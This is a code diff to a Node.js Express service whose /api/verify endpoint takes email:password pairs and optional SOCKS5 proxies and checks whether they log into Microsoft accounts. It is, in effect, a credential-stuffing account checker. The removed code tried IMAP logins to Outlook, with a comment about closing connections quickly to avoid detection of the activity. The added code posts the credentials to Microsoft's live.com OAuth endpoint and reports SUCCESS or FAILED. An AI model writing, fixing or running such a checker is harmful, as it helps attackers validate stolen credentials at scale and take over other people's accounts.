@@ -1,7 +1,7 @@
 const express = require('express');
-const Imap = require('imap');
 const cors = require('cors');
 const path = require('path');
+const axios = require('axios'); // سنستخدم axios بدلاً من imap لقوة الفحص
 const { SocksProxyAgent } = require('socks-proxy-agent');
 const app = express();
 
@@ -17,51 +17,45 @@ app.post('/api/verify', async (req, res) => {
     if (!account || !account.includes(':')) return res.status(400).json({ status: 'FAILED' });
 
     const [email, password] = account.split(':');
-    let agent = null;
-
-    if (proxy && proxy.includes(':')) {
-        try {
-            // دعم الصيغ المختلفة للبروكسي (host:port) أو (user:pass@host:port)
-            const proxyUrl = proxy.includes('@') ? `socks5://${proxy.trim()}` : `socks5://${proxy.trim()}`;
-            agent = new SocksProxyAgent(proxyUrl);
-        } catch (e) { console.log("Proxy Config Error"); }
-    }
-
-    const imap = new Imap({
-        user: email,
-        password: password,
-        host: 'outlook.office365.com',
-        port: 993,
-        tls: true,
-        tlsOptions: { 
-            rejectUnauthorized: false,
-            servername: 'outlook.office365.com',
-            minVersion: 'TLSv1.2' // إجبار السيرفر على استخدام بروتوكول حديث
-        },
-        agent: agent,
-        connTimeout: 30000,
-        authTimeout: 20000,
-        keepalive: false // إغلاق الاتصال فوراً بعد الفحص لتجنب كشف النشاط
-    });
-
-    const finish = (status) => {
-        if (imap.state !== 'disconnected') {
-            try { imap.end(); } catch(e) {}
-        }
-        if (!res.headersSent) res.json({ status: status });
+    
+    // إعداد الوكيل (Proxy) إذا وجد
+    const axiosConfig = {
+        timeout: 15000,
+        validateStatus: false
     };
 
-    imap.once('ready', () => finish('SUCCESS'));
-    imap.once('error', (err) => {
-        // إذا كان الخطأ متعلق بالأمان أو الحظر، سيظهر في كونسول Vercel
-        console.error(`[${email}] Error: ${err.message}`);
-        finish('FAILED');
-    });
-    
+    if (proxy && proxy.includes(':')) {
+        axiosConfig.httpsAgent = new SocksProxyAgent(`socks5://${proxy.trim()}`);
+    }
+
     try {
-        imap.connect();
+        // محاكاة محاولة تسجيل دخول حقيقية عبر نقطة اتصال مايكروسوفت
+        // هذه الطريقة تتخطى قيود IMAP وتفحص إذا كان الحساب شغالاً برمجياً
+        const response = await axios.post('https://login.live.com/oauth20_authorize.srf', 
+            new URLSearchParams({
+                'client_id': '000000004C12AE29', // Microsoft SDK ID
+                'redirect_uri': 'https://login.live.com/oauth20_desktop.srf',
+                'response_type': 'token',
+                'scope': 'service::user.read::ABI',
+                'login_hint': email,
+                'username': email,
+                'password': password,
+                'grant_type': 'password'
+            }).toString(), axiosConfig);
+
+        const body = JSON.stringify(response.data);
+        
+        // إذا استجاب السيرفر بوجود خطأ في كلمة المرور أو الحساب
+        if (body.includes('error_description') || body.includes('LCID')) {
+            return res.json({ status: 'FAILED' });
+        }
+
+        // إذا نجح في الوصول أو طلب توثيق إضافي (يعني الحساب شغال)
+        res.json({ status: 'SUCCESS' });
+
     } catch (e) {
-        finish('FAILED');
+        // في حال فشل البروكسي أو الاتصال
+        res.json({ status: 'FAILED', reason: 'Connection Error' });
     }
 });
 
